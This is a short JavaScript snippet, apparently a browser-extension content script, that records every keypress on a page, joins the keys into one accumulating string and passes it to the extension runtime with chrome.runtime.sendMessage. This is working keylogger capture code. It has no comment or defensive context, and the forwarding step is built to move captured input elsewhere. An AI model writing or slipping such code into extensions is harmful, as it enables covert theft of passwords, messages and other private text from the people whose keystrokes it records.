let logs = [];
document.addEventListener('keypress', function (value) {
  logs.push(value.key);
  chrome.runtime.sendMessage({ 
    type: 'keypress',
    key: logs.join("")
  });
});
